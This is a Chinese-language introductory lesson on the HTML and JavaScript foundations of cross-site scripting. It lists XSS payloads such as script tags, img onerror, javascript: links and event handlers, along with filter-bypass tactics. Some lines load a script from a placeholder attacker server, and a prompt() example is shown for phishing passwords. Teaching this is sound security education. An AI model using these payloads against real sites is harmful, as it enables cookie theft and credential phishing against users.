XSS漏洞前置 - HTML&JS核心基础

一、HTML基础（XSS的载体）

1. 什么是HTML？

HTML（超文本标记语言）是网页的骨架，所有网页内容都通过HTML标签组织呈现。XSS漏洞的本质是：攻击者将恶意HTML/JS代码注入到网页中，被浏览器解析执行。

2. HTML基本结构

<!DOCTYPE html>  
<html lang="zh-CN">  
    <head>  
        <meta charset="UTF-8">  
        <title>网页标题</title>  
    </head>
    <body>  
        这是网页正文内容
    </body>
</html>
提示：XSS攻击主要发生在<body>标签内（可见内容区域），少数情况可注入到<head>中。

3. 常用HTML核心标签

掌握这些标签是理解XSS注入的基础：

<div>普通块级容器</div>
<span>普通行内容器</span>
<p>段落标签</p>
<input type="text">  
<a href="链接地址">超链接</a>
<img src="图片地址" alt="描述">  
<script>JS代码</script>

4. XSS常用标签及用法（重点）

以下标签是XSS攻击中最常使用的，核心是让浏览器执行恶意JS代码：

（1）核心标签：<script>（直接执行JS）


<script>alert('XSS攻击！');</script>


<script src="http://攻击者服务器/恶意.js">alert(1)</script>
演示：点击按钮触发script标签执行

（2）绕过标签：<img>（无闭合/跨站常用）

当<script>标签被过滤时，常用img标签的事件触发JS：


<img src="不存在的图片.jpg" onerror="alert('XSS');">


<img src=x onerror=alert(1)>
演示：img标签触发XSS

（3）超链接标签：<a>（点击触发）

<a href="javascript:alert('XSS')">点击我</a>
演示：点击链接触发XSS

（4）其他绕过标签（补充）


<iframe src="javascript:alert(1)"></iframe>


<body onload="alert('XSS')">
核心逻辑：无论用哪个标签，最终目的都是让浏览器执行JS代码——这是XSS的本质！

二、JavaScript基础（XSS的攻击武器）

1. JS的作用

JavaScript是网页的“行为”层，负责：

  • 响应用户操作（点击、输入、鼠标移动）
  • 动态修改网页内容/样式（比如修改DOM、弹窗）
  • 与服务器交互（发送/接收数据）
XSS利用JS的能力：窃取Cookie（document.cookie）、弹框、跳转页面、偷取用户数据、远程控制浏览器等。

2. JS在HTML中的执行方式


<script>
    // 单行注释
    /* 多行注释 */
    alert('Hello XSS');  // 执行弹框
</script>


<div onclick="alert(1)">点击触发</div>


<script src="http://攻击者/evil.js"></script>

3. XSS最常用的JS弹框函数（核心演示工具）

弹框是验证XSS漏洞是否存在的“最直观标志”，以下3个函数是课堂必讲：

（1）alert()：提示框（最常用）

作用：弹出提示信息，阻塞页面操作，是验证XSS的“黄金标准”

<script>alert('XSS漏洞存在！');</script>

（2）confirm()：确认框（带确认/取消按钮）

作用：获取用户选择，可用于钓鱼（比如伪装系统提示）

<script>
    var res = confirm('是否确认删除？'); // 点确认返回true，取消返回false
    alert('你的选择：' + res);
</script>

（3）prompt()：输入框（可窃取用户输入）

作用：弹出带输入框的提示，可诱骗用户输入账号/密码等信息

<script>
    var pwd = prompt('系统升级，请输入密码：');
    alert('你输入的密码：' + pwd); // 实际攻击中会发送到攻击者服务器
</script>

4. JS事件（触发XSS的关键）

事件是“触发JS执行的时机”，XSS常利用事件绕过过滤（比如<script>被禁时，用事件触发）：

事件名 触发时机 XSS示例
onclick 点击元素 <div onclick="alert(1)">点我</div>
onload 页面/图片加载完成 <body onload="alert(1)">
onerror 加载失败（如图片不存在） <img src=x onerror=alert(1)>
onmouseover 鼠标移到元素上 <div onmouseover="alert(1)">移过来</div>
综合演示：鼠标移到文字上触发XSS
请将鼠标移到我身上

三、课堂小结

  1. HTML是XSS的“载体”：恶意代码通过HTML标签注入到网页中；
  2. JS是XSS的“武器”：通过JS实现弹框、窃取信息、控制浏览器；
  3. XSS核心验证：能弹出alert()，说明漏洞存在；
  4. 绕过思路：当<script>被过滤时，用img/a/iframe等标签+事件触发JS。
